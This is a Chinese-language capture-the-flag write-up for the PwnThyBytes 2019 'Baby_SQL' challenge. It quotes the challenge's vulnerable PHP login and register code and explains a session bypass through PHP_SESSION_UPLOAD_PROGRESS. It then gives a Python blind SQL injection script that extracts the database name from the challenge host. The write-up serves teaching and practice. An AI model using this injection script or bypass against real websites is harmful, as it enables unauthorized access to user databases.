# \[PwnThyBytes 2019]Baby\_SQL

## \[PwnThyBytes 2019]Baby\_SQL

## 考点

## wp

F12发现提示`/source.zip`，访问得到源码。

在index.php中对所有的输入进行判断，必须是字符串然后做addslashes处理。然后是进行路由处理，主要有3个文件，home.php、login.php和register.php

```php
foreach ($_SESSION as $key => $value): $_SESSION[$key] = filter($value); endforeach;
foreach ($_GET as $key => $value): $_GET[$key] = filter($value); endforeach;
foreach ($_POST as $key => $value): $_POST[$key] = filter($value); endforeach;
foreach ($_REQUEST as $key => $value): $_REQUEST[$key] = filter($value); endforeach;

function filter($value)
{
    !is_string($value) AND die("Hacking attempt!");

    return addslashes($value);
}
```

在注册处，username的条件

1. 不能包含`admin`中的任一字符
2. 长度6-10
3. 必须由字母和数字组成

然后插入数据库

```php
(preg_match('/(a|d|m|i|n)/', strtolower($_POST['username'])) OR strlen($_POST['username']) < 6 OR strlen($_POST['username']) > 10 OR !ctype_alnum($_POST['username'])) AND $con->close() AND die("Not allowed!");

$sql = 'INSERT INTO `ptbctf`.`ptbctf` (`username`, `password`) VALUES ("' . $_POST['username'] . '","' . md5($_POST['password']) . '")';
```

登录处使用select语句验证账号密码，然后把用户名写入session

```php
$sql = 'SELECT `username`,`password` FROM `ptbctf`.`ptbctf` where `username`="' . $_GET['username'] . '" and password="' . md5($_GET['password']) . '";';
function auth($user){
    $_SESSION['username'] = $user;
    return True;
}
```

home是只返回一个静态页面。

这里在用了session，只在index.php进行初始化，后面每个页面都是判断session是否存在。

那可以通过PHP\_SESSION\_UPLOAD\_PROGRESS上传一个session，在templates/login.php页面进行盲注即可

```
#coding=utf-8 
import io
import requests
import time


sessid = 'peri0d'
url = 'http://0ac378b0-b87d-4881-a72b-ed216904678e.node4.buuoj.cn:81/templates/login.php'
s = requests.session()
while True:
    f = io.BytesIO(b'a' * 1024 * 50)
    flag = ''
    for i in range(1, 50):
        print(flag)
        for j in range(255):
            payload = {
            'username': f'1" or (ascii(mid(select database(),{i},1))={j})#',
            'password': '111'
            
            }
            r = s.post(url=url, data={'PHP_SESSION_UPLOAD_PROGRESS': '123456'}, files={'file': ('peri0d.txt',f)}, cookies={'PHPSESSID': sessid}, params=payload)
            # print(r.text)
            time.sleep(0.1)
            if 'meta' in r.text:
                flag = flag + chr(j)
                break




```
